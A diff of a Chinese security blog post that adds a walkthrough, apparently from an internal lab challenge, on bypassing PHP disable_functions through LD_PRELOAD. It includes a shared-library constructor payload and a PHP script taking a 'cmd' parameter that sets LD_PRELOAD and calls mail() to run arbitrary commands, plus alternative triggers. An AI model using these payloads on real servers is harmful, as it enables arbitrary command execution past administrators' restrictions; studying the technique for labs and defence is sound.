@@ -19,18 +19,23 @@
 
 <script class="next-config" data-name="main" type="application/json">{"hostname":"example.com","root":"/","images":"/images","scheme":"Pisces","darkmode":false,"version":"8.20.0","exturl":false,"sidebar":{"position":"left","width_expanded":320,"width_dual_column":240,"display":"post","padding":18,"offset":12},"copycode":{"enable":false,"style":null},"fold":{"enable":false,"height":500},"bookmark":{"enable":false,"color":"#222","save":"auto"},"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"stickytabs":false,"motion":{"enable":true,"async":false,"transition":{"menu_item":"fadeInDown","post_block":"fadeIn","post_header":"fadeInDown","post_body":"fadeInDown","coll_header":"fadeInLeft","sidebar":"fadeInUp"}},"i18n":{"placeholder":"Searching...","empty":"We didn't find any results for the search: ${query}","hits_time":"${hits} results found in ${time} ms","hits":"${hits} results found"}}</script><script src="/js/config.js"></script>
 
-    <meta name="description" content="前言之前遇到bypass_disablefunc 都是直接用蚁剑来打的。没有深入到利用里面，这次恰好遇到内部靶场babytrick这道题，不能简单的利用蚁剑来进行bypass，而是需要在对LD_PRELOAD 理解的基础上对已有脚本进行修改，这篇文章参考网上博客和deepseek，重新梳理一下。">
+    <meta name="description" content="前言之前遇到bypass_disablefunc 都是直接用蚁剑来打的。没有深入到利用里面，这次恰好遇到内部靶场babytrick这道题，不能简单的利用蚁剑来进行bypass，而是需要在对LD_PRELOAD 理解的基础上对已有脚本bypass_disablefunc.c和bypass_disablefunc.php进行修改，这篇文章参考网上博客和deepseek，重新梳理一下。">
 <meta property="og:type" content="article">
 <meta property="og:title" content="php bypass disable_function 篇一">
 <meta property="og:url" content="http://example.com/2026/01/08/php-bypass-disable-function%E7%AF%87%E4%B8%80/index.html">
 <meta property="og:site_name" content="My0n9s&#39;blog">
-<meta property="og:description" content="前言之前遇到bypass_disablefunc 都是直接用蚁剑来打的。没有深入到利用里面，这次恰好遇到内部靶场babytrick这道题，不能简单的利用蚁剑来进行bypass，而是需要在对LD_PRELOAD 理解的基础上对已有脚本进行修改，这篇文章参考网上博客和deepseek，重新梳理一下。">
+<meta property="og:description" content="前言之前遇到bypass_disablefunc 都是直接用蚁剑来打的。没有深入到利用里面，这次恰好遇到内部靶场babytrick这道题，不能简单的利用蚁剑来进行bypass，而是需要在对LD_PRELOAD 理解的基础上对已有脚本bypass_disablefunc.c和bypass_disablefunc.php进行修改，这篇文章参考网上博客和deepseek，重新梳理一下。">
 <meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://yk.jsdu.cn/20260109/e8f7bdfb99594d901aa7b9e3a7094bc3.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260109/eec4f990fddb9d671acd00e8f3f98b82.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260109/c4fdc02ea5cd89ac603fb55c04b487cc.png">
+<meta property="og:image" content="https://yk.jsdu.cn/20260110/f6d80306d3a7f8377b319d0a606d7b9f.png">
 <meta property="article:published_time" content="2026-01-08T06:48:27.000Z">
-<meta property="article:modified_time" content="2026-01-08T09:52:59.692Z">
+<meta property="article:modified_time" content="2026-01-10T04:53:04.077Z">
 <meta property="article:author" content="My0n9s">
 <meta property="article:tag" content="bypass">
 <meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://yk.jsdu.cn/20260109/e8f7bdfb99594d901aa7b9e3a7094bc3.png">
 
 
 <link rel="canonical" href="http://example.com/2026/01/08/php-bypass-disable-function%E7%AF%87%E4%B8%80/">
@@ -112,7 +117,7 @@
       <div class="sidebar-panel-container">
         <!--noindex-->
         <div class="post-toc-wrap sidebar-panel">
-            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li></ol></div>
+            <div class="post-toc animated"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#%E5%89%8D%E8%A8%80"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#LD-PRELOAD"><span class="nav-number">1.1.</span> <span class="nav-text">LD_PRELOAD</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#%E5%90%8C%E5%90%8D%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81"><span class="nav-number">1.1.1.</span> <span class="nav-text">同名函数劫持</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%88%A9%E7%94%A8%E6%9D%A1%E4%BB%B6"><span class="nav-number">1.1.1.1.</span> <span class="nav-text">利用条件</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#%E5%85%B7%E4%BD%93%E5%88%A9%E7%94%A8"><span class="nav-number">1.1.1.2.</span> <span class="nav-text">具体利用</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#%E6%97%A0%E9%9C%80%E5%90%8C%E5%90%8D%E5%87%BD%E6%95%B0%E5%8A%AB%E6%8C%81"><span class="nav-number">1.1.2.</span> <span class="nav-text">无需同名函数劫持</span></a></li></ol></li></ol></li></ol></div>
         </div>
         <!--/noindex-->
 
@@ -193,9 +198,15 @@
         <i class="far fa-calendar"></i>
       </span>
       <span class="post-meta-item-text">Posted on</span>
-      
 
-      <time title="Created: 2026-01-08 14:48:27 / Modified: 17:52:59" itemprop="dateCreated datePublished" datetime="2026-01-08T14:48:27+08:00">2026-01-08</time>
+      <time title="Created: 2026-01-08 14:48:27" itemprop="dateCreated datePublished" datetime="2026-01-08T14:48:27+08:00">2026-01-08</time>
+    </span>
+    <span class="post-meta-item">
+      <span class="post-meta-item-icon">
+        <i class="far fa-calendar-check"></i>
+      </span>
+      <span class="post-meta-item-text">Edited on</span>
+      <time title="Modified: 2026-01-10 12:53:04" itemprop="dateModified" datetime="2026-01-10T12:53:04+08:00">2026-01-10</time>
     </span>
 
   
@@ -207,7 +218,60 @@
     
     
     
-    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前遇到<code>bypass_disablefunc</code> 都是直接用蚁剑来打的。没有深入到利用里面，这次恰好遇到内部靶场<code>babytrick</code>这道题，不能简单的利用蚁剑来进行bypass，而是需要在对<code>LD_PRELOAD </code>理解的基础上对已有脚本进行修改，这篇文章参考网上博客和<code>deepseek</code>，重新梳理一下。</p>
+    <div class="post-body" itemprop="articleBody"><h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>之前遇到<code>bypass_disablefunc</code> 都是直接用蚁剑来打的。没有深入到利用里面，这次恰好遇到内部靶场<code>babytrick</code>这道题，不能简单的利用蚁剑来进行bypass，而是需要在对<code>LD_PRELOAD </code>理解的基础上对已有脚本<code>bypass_disablefunc.c</code>和<code>bypass_disablefunc.php</code>进行修改，这篇文章参考网上博客和<code>deepseek</code>，重新梳理一下。</p>
+<span id="more"></span>
+
+<h2 id="LD-PRELOAD"><a href="#LD-PRELOAD" class="headerlink" title="LD_PRELOAD"></a>LD_PRELOAD</h2><p><code>LD_PRELOAD</code>是LINUX系统的一个环境变量，默认情况下的值为空，在 Linux 中，动态链接器（如 <code>ld-linux.so</code>）负责在程序运行时加载所需的库。通常情况下，链接器会按照预定义的路径搜索库文件。如果你设置了 <code>LD_PRELOAD</code>，链接器会首先加载该变量中指定的库。如果预加载的库中包含与后续库（如 <code>libc.so</code>）<strong>同名</strong>的函数，程序将优先使用预加载库中的版本。</p>
+<p> 可以复现个demo感受下劫持：</p>
+<p><code>id.c</code>:</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;dlfcn.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/types.h&gt;</span><br><span class="line"></span><br><span class="line">uid_t geteuid( void ) &#123; return 0; &#125;</span><br><span class="line">uid_t getuid( void ) &#123; return 0; &#125;</span><br><span class="line">uid_t getgid( void ) &#123; return 0; &#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>gcc -shared -o id.so id.c</code> ， 将<code>id.c</code>文件编译成<code>id.so</code></p>
+<p>接着<code>export=./id.so</code>  现在在执行id，可以发现变成root的了。</p>
+<p><img src="https://yk.jsdu.cn/20260109/e8f7bdfb99594d901aa7b9e3a7094bc3.png" alt="ld_preload1"></p>
+<p>我们 <code>ldd /usr/bin/id</code> 可以发现<code>id.so</code> 在<code>libc.so</code> 等其他库前面被加载：</p>
+<p><img src="https://yk.jsdu.cn/20260109/eec4f990fddb9d671acd00e8f3f98b82.png" alt="ld_preload2"></p>
+<h3 id="同名函数劫持"><a href="#同名函数劫持" class="headerlink" title="同名函数劫持"></a>同名函数劫持</h3><p>可以看到我们上面编译的<code>id.c</code> 里面用到了<code>getuid</code>函数，而本身<code>/usr/bin/id</code>命令对应的C程序里面main函数也调用了<code>getuid</code>函数。那么问题来了，为什么一定得保证同名呢？我们来看几张图：</p>
+<p>动态链接器的工作原理：</p>
+<p><img src="https://yk.jsdu.cn/20260109/c4fdc02ea5cd89ac603fb55c04b487cc.png" alt="ld_preload3"></p>
+<h4 id="利用条件"><a href="#利用条件" class="headerlink" title="利用条件"></a>利用条件</h4><p>当我们进行同名函数劫持时，需要满足以下几个条件：</p>
+<p>1.putenv未被禁用</p>
+<p>2.有目录可以写文件</p>
+<p>3.有可利用的函数，比如mail、error_log等，并且还要找到可利用的同名函数。</p>
+<h4 id="具体利用"><a href="#具体利用" class="headerlink" title="具体利用"></a>具体利用</h4><p>这里以mail函数为例，php的mail函数本质上是会调用linux的sendmail函数，我们可以<code>readelf -Ws /usr/sbin/sendmail</code> 来看一下<code>sendmail</code>有哪些函数：</p>
+<p><img src="https://yk.jsdu.cn/20260110/f6d80306d3a7f8377b319d0a606d7b9f.png" alt="ld_preload5"></p>
+<p>所以这里我们可以选择<code>geteuid</code>来劫持，要保持写的同名函数返回类型和参数类型及数量和原函数一致，<code>test.c</code>:</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="type">void</span> <span class="title function_">payload</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line">  system(<span class="string">&quot;ls&quot;</span>);</span><br><span class="line">&#125;   </span><br><span class="line"><span class="type">int</span>  <span class="title function_">geteuid</span><span class="params">()</span> </span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (getenv(<span class="string">&quot;LD_PRELOAD&quot;</span>) == <span class="literal">NULL</span>) &#123; <span class="keyword">return</span> <span class="number">0</span>; &#125;</span><br><span class="line">unsetenv(<span class="string">&quot;LD_PRELOAD&quot;</span>);</span><br><span class="line">payload();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>编译成<code>.so</code> 文件： </p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">gcc -c -fPIC test.c -o test</span><br><span class="line">gcc --share test -o test.so</span><br></pre></td></tr></table></figure>
+
+<p>接着编写php文件：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=./test.so&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="string">&quot;&quot;</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>把<code>.so</code>文件和<code>.php</code>文件进行上传，访问php文件，可以发现执行了 <code>ls</code>命令。</p>
+<h3 id="无需同名函数劫持"><a href="#无需同名函数劫持" class="headerlink" title="无需同名函数劫持"></a>无需同名函数劫持</h3><p>按照上面同名函数劫持的情况，我们<code>linux</code>系统本身是得装了<code>sendmail</code>这个函数的，那如果没有装呢？是不是就利用不了了，对此有个更通用的解决方式：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">__attribute__可以设置函数属性(Function Attribute)、变量属性(Variable Attribute)和类型属性(Type Attribute)。__attribute__前后都有两个下划线，并且后面会紧跟一对原括弧，括弧里面是相应的__attribute__参数</span><br><span class="line"></span><br><span class="line">__attribute__语法格式为：__attribute__ ( ( attribute-list ) )</span><br><span class="line">若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行。类似的，若函数被设定为destructor属性，则该函数会在main（）函数执行之后或者exit（）被调用后被自动的执行。</span><br></pre></td></tr></table></figure>
+
+<p>主要是这句话:<code>若函数被设定为constructor属性，则该函数会在main（）函数执行之前被自动的执行</code></p>
+<p>于是有了大佬的脚本：</p>
+<p><code>bypass_disablefunc.c:</code></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">#define _GNU_SOURCE</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">extern char** environ;</span><br><span class="line">__attribute__ ((__constructor__)) void preload (void)</span><br><span class="line">&#123;</span><br><span class="line">    // get command line options and arg</span><br><span class="line">    const char* cmdline = getenv(&quot;EVIL_CMDLINE&quot;);</span><br><span class="line"></span><br><span class="line">    // unset environment variable LD_PRELOAD.</span><br><span class="line">    // unsetenv(&quot;LD_PRELOAD&quot;) no effect on some </span><br><span class="line">    // distribution (e.g., centos), I need crafty trick.</span><br><span class="line">    int i;</span><br><span class="line">    for (i = 0; environ[i]; ++i) &#123;</span><br><span class="line">            if (strstr(environ[i], &quot;LD_PRELOAD&quot;)) &#123;</span><br><span class="line">                    environ[i][0] = &#x27;\0&#x27;;</span><br><span class="line">            &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    // executive command</span><br><span class="line">    system(cmdline);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>bypass_disfunc.php:</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;example&lt;/b&gt;: http://site.com/bypass_disablefunc.php?cmd=pwd&amp;outpath=/tmp/xx&amp;sopath=/var/www/bypass_disablefunc_x64.so &lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="variable">$_GET</span>[<span class="string">&quot;cmd&quot;</span>];</span><br><span class="line">    <span class="variable">$out_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;outpath&quot;</span>];</span><br><span class="line">    <span class="variable">$evil_cmdline</span> = <span class="variable">$cmd</span> . <span class="string">&quot; &gt; &quot;</span> . <span class="variable">$out_path</span> . <span class="string">&quot; 2&gt;&amp;1&quot;</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;cmdline&lt;/b&gt;: &quot;</span> . <span class="variable">$evil_cmdline</span> . <span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;EVIL_CMDLINE=&quot;</span> . <span class="variable">$evil_cmdline</span>);</span><br><span class="line">    <span class="variable">$so_path</span> = <span class="variable">$_GET</span>[<span class="string">&quot;sopath&quot;</span>];</span><br><span class="line">    <span class="title function_ invoke__">putenv</span>(<span class="string">&quot;LD_PRELOAD=&quot;</span> . <span class="variable">$so_path</span>);</span><br><span class="line">    <span class="title function_ invoke__">mail</span>(<span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;&lt;p&gt; &lt;b&gt;output&lt;/b&gt;: &lt;br /&gt;&quot;</span> . <span class="title function_ invoke__">nl2br</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$out_path</span>)) . <span class="string">&quot;&lt;/p&gt;&quot;</span>; </span><br><span class="line">    <span class="title function_ invoke__">unlink</span>(<span class="variable">$out_path</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>根据实际情况的不同，这里<code>mail</code>函数要做相应的替换，这里可以看内部靶场1229-1011的babytrick那个例子。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">mail(&quot;&quot;,&quot;&quot;,&quot;&quot;,&quot;&quot;);  //依赖sendmail</span><br><span class="line">error_log(&quot;&quot;, 1, &quot;&quot;);//依赖sendmail</span><br><span class="line">@gnupg_import(gnupg_init(), &quot;dummy&quot;);//</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+
+
 
     </div>
 
